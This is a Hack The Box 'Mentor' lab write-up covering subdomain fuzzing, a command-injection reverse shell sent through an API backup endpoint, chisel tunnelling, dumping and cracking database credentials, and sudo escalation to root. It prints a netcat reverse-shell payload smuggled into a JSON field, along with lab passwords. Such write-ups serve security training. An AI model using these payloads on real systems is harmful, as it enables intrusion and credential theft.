# HTB-Mentor

Hack the Box has released a new machine called Mentor . It's a very easy machine compared to medium level . <br><br> 
The IP of this machine is ``10.129.84.145``. 
![Mentor](https://user-images.githubusercontent.com/114393219/206896209-01c78889-0dd5-4e9f-941c-439e11b20dcb.png)
<br> <br>
Lets get started !!
<br>
I first started with nmap scan by the command ``nmap -T4 -A 10.129.84.145`` , as usual two ports were open port `22` and `80` . <br>
# Nmap Scan
````
└─# nmap -T4 -A 10.129.84.145
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-11 15:07 IST
Nmap scan report for 10.129.84.145
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)
|_  256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/11%OT=22%CT=1%CU=35835%PV=Y%DS=2%DC=T%G=Y%TM=6395A5
OS:04%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=110%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST
OS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   282.33 ms 10.10.14.1
2   282.43 ms 10.129.84.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.03 seconds
````
Then add ``mentorquotes.htb`` to ``/etc/hosts``
<br>
# FOOTHOLD 
## Subdomain
I started subdomain enumeration using fuff : ``ffuf -u "http://mentorquotes.htb" -H "Host: FUZZ.mentorquotes.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -fc 302`` <br>
<br>
I got ``api.mentorquotes.htb`` and added it to ``/etc/hosts`` . <br>
## Directories 
Now Scan directories in ``api.mentorquotes.htb`` using command : ``ffuf -u "http://api.mentorquotes.htb/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt - mc all -fc 404`` <br><br>
I got this result :
![image](https://user-images.githubusercontent.com/114393219/206897099-faa5d8c4-4a7f-46d1-8ced-633c2a19b7c7.png)
<br><br>
``http://api.mentorquotes.htb/docs`` &  ``http://api.mentorquotes.htb/admin`` are intresting . <br><br>
After visiting ``http://api.mentorquotes.htb/docs`` we found that there is admin(James).
<br><br>
![image](https://user-images.githubusercontent.com/114393219/206897480-72544262-c828-4556-9520-158edf585ea7.png)
<br><br>
Now create a new user with same name as "James" but with different mail . <br><br>
![image](https://user-images.githubusercontent.com/114393219/206898094-9bac2d2b-5edb-41a8-bbe3-60d7756c4466.png)
<br><br>
Then login and get your authorization token .
![image](https://user-images.githubusercontent.com/114393219/206898185-e641818c-c9cf-4556-b76a-0e3516aae577.png)
<br><br>
## Lets get Reverse Shell : 
<br>
Curl this payload to get reverse shell :

````
curl -X 'POST' \
'http://api.mentorquotes.htb/admin/backup' \
-H 'accept: application/json' \
-H 'Content-Type: application/json' \
-H 'Authorization: <your_token>' \
-d '{
"path": "`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> <PORT> >/tmp/f`"
}'
````
Note : Make  sure you have started a netcat listner on your attacker machine using ``nc -lvnp <PORT>``.
<br><br>

![image](https://user-images.githubusercontent.com/114393219/206898547-253e4a25-fbc1-4254-bfac-d46e48a5e751.png)

<br><br> 

And Boom !! We got reverse shell :
<br><br>

![image](https://user-images.githubusercontent.com/114393219/206898618-36ddf815-c678-4b1f-abe9-14a2b17f0f6a.png)
<br><br>

After few research I found intresting file in ``/app/app/db.py`` . <br>
Now cat out the contents on ``db.py`` and we got the DB creds .
![image](https://user-images.githubusercontent.com/114393219/206899466-ef0e0533-b7f5-4d99-8f5e-cf81083ec2a5.png)

<br><br>
## Port Forwarding
Now we have to do port forwarding(postgresql port) so that we can access DB locally on our machine using ``chisel`` .
<br>
By Using Python http server, deliver the chisel binary to our target's `/tmp` folder. <br>
On Attacker Machine (Kali) :
````
./chisel server --port 8888 --reverse
````
On Target : 
````
./chisel client -v <Attacker_IP>:8888 R:5432:172.22.0.1:5432
````
## SSH 
After successfully port forwarding , dump the Postgresql DB using cmd : 
````
pg_dump -h 127.0.0.1 -p 5432 -d mentorquotes_db -U postgres -W
````
password : postgres <br>
<br>
We got the creds :
![image](https://user-images.githubusercontent.com/114393219/206900436-15d0bff6-c954-472b-9a6a-1707964a07fd.png)

<br>

But its a hash(MD5) , Now crack it using ``hashcat`` . James password was unable to crack but we cracked the svc password ``53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani`` .
<br>

Now Let's SSH to ```svc@mentorquotes.htb``` using the creds we got . 
<br><br>
Now we are in as svc user ! & grab the user flag .

![image](https://user-images.githubusercontent.com/114393219/206901084-e004141b-7be2-4308-824c-aee2aa2a9237.png)

## Priv-Esc
I tried `sudo -l` but svc is unable to use sudo on `mentorquotes.htb` . Then using this cmd ``grep -iR pass /etc`` , I found intesting config file i.e ``/etc/snmp/snmpd.conf`` . <br><br>

![image](https://user-images.githubusercontent.com/114393219/206901316-2ff204e0-f677-444a-b8ad-ca9ff6de4eef.png)

We got the James password ``SuperSecurePassword123__`` . Now ``su james`` and enter the password we found in that .conf file . <br>
Now we are user James !! 
<br><br>

![image](https://user-images.githubusercontent.com/114393219/206901688-22095f09-927b-4401-8e31-4363a81e53b3.png)

## Root
In this box getting root is very easy :) . <br>
Just ``sudo /bin/sh`` and now you are root !!
<br><br>

![image](https://user-images.githubusercontent.com/114393219/206902080-92d6fecb-8ea4-4fdd-ad0c-40a66eca82b6.png)

Thank you for reading :) ! Have a nice day !

